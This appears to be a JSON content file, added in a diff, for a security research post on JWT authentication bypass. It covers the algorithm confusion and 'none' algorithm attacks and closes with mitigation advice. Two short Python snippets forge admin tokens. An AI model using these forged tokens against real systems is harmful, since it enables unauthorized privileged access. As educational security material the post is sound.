@@ -1,0 +1,63 @@
+{
+  "id": "research-jwt-bypass",
+  "title": "JWT Authentication Bypass Techniques",
+  "slug": "jwt-bypass-techniques",
+  "category": "research",
+  "tags": [
+    "JWT",
+    "Authentication",
+    "Web Security",
+    "Cryptography"
+  ],
+  "difficulty": "Medium",
+  "date": "2024-11-28",
+  "summary": "Deep dive into common JWT vulnerabilities including algorithm confusion, key injection, and signature bypass methods.",
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Introduction"
+    },
+    {
+      "type": "paragraph",
+      "text": "JSON Web Tokens (JWTs) are widely used for authentication. However, improper implementations can lead to severe vulnerabilities."
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Algorithm Confusion Attack"
+    },
+    {
+      "type": "paragraph",
+      "text": "When servers accept both HS256 and RS256, an attacker can sign tokens with the public key using HS256."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "import jwt\nimport base64\n\n# Read the public key\nwith open('public.pem', 'r') as f:\n    public_key = f.read()\n\n# Create malicious token\npayload = {'user': 'admin', 'role': 'admin'}\ntoken = jwt.encode(payload, public_key, algorithm='HS256')\n\nprint(f'Malicious token: {token}')"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "None Algorithm Attack"
+    },
+    {
+      "type": "paragraph",
+      "text": "Some libraries accept 'none' as a valid algorithm, allowing unsigned tokens."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "code": "# Craft token with 'none' algorithm\nheader = base64.b64encode('{\"alg\":\"none\",\"typ\":\"JWT\"}'.encode()).decode().rstrip('=')\npayload = base64.b64encode('{\"user\":\"admin\"}'.encode()).decode().rstrip('=')\ntoken = f\"{header}.{payload}.\"\n\nprint(f'Unsigned token: {token}')"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Mitigation"
+    },
+    {
+      "type": "paragraph",
+      "text": "Always explicitly specify allowed algorithms on the server side. Never accept 'none'. Use strong keys and rotate them regularly."
+    }
+  ]
+}
